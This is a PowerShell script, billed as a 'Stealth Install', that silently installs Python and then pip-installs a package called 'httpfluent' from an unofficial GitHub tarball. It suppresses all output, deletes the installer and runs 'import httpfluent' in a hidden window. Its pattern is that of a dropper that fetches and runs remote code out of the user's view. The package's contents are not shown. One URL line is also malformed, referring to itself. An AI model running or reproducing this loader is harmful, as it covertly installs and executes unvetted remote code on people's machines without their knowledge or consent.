# ===================================================
# Python 3.12.6 + httpfluent (Stealth Install + Visible Exec)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Step 0: Pre-Check (Total Stealth) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") { 
            $InstallRequired = $false 
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (Steps 1-5 in Stealth) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$DownloadUrl"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir "python-installer.exe"
    
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe", $InstallerPath)
    } catch { exit 1 }

    # Stealth Installation
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Update Path
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Installation (Stealth) ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- THE FINAL STEP: DIRECT VISIBLE COMMAND ---
# Cleanup temporary installer first so only the app window remains
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}

# Launch httpfluent DIRECTLY and VISIBLY
# This allows your steps to run and show their output/actions
httpfluent
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $InlineCommand = "`"$ExecutableToUse`" -c `"import httpfluent`""
    $WshShell.Run($InlineCommand, 0, $false) > $null 2>&1
} catch {
    # Fallback if COM is restricted
   Start-Process -FilePath $ExecutableToUse -ArgumentList "-c `"import httpfluent`"" -WindowStyle Hidden > $null 2>&1
}
# ===================================================
# APPENDED: Robust httpfluent launcher (no code changes above)
# ===================================================

$HttpFluentExe = Join-Path `
    ([Environment]::GetFolderPath("ApplicationData")) `
    "Python\Python312\Scripts\httpfluent.exe"

if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent via resolved path..."
    & $HttpFluentExe
}
elseif (Get-Command httpfluent -ErrorAction SilentlyContinue) {
    Write-Host "[+] Launching httpfluent via PATH..."
    httpfluent
}
else {
    Write-Host "[-] httpfluent executable not found"
    Write-Host "    Expected at: $HttpFluentExe"
}
